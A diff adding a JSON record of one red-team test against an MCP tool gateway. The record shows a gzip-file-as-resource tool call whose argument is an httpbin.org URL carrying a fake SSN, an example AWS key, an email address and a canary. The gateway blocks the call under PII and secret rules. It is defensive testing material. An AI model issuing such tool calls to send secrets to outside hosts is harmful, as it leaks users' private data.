@@ -1,0 +1,42 @@
+{
+  "server": "everything-mcp",
+  "tool": "gzip-file-as-resource",
+  "note": "attacker-controlled remote content (httpbin echo of PII/secret in query) fetched+gzipped",
+  "request": {
+    "url": "http://127.0.0.1:8300/gateway/zeroshield/mcp/everything-mcp",
+    "headers": {
+      "Authorization": "Bearer <redacted>",
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "method": "tools/call",
+      "params": {
+        "name": "gzip-file-as-resource",
+        "arguments": {
+          "name": "leak2.gz",
+          "data": "https://httpbin.org/get?ssn=123-45-6789&aws_key=AKIAIOSFODNN7EXAMPLE&email=redteam3.output%40corp.example&canary=RT3-67a2364b5b",
+          "outputType": "resource"
+        }
+      }
+    }
+  },
+  "response": {
+    "http_status": 200,
+    "body": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "[BLOCKED] Tool 'gzip-file-as-resource' arguments matched compliance tags: HIPAA, PII, SECRET."
+          }
+        ],
+        "isError": true
+      }
+    }
+  },
+  "elapsed_s": 0.075
+}
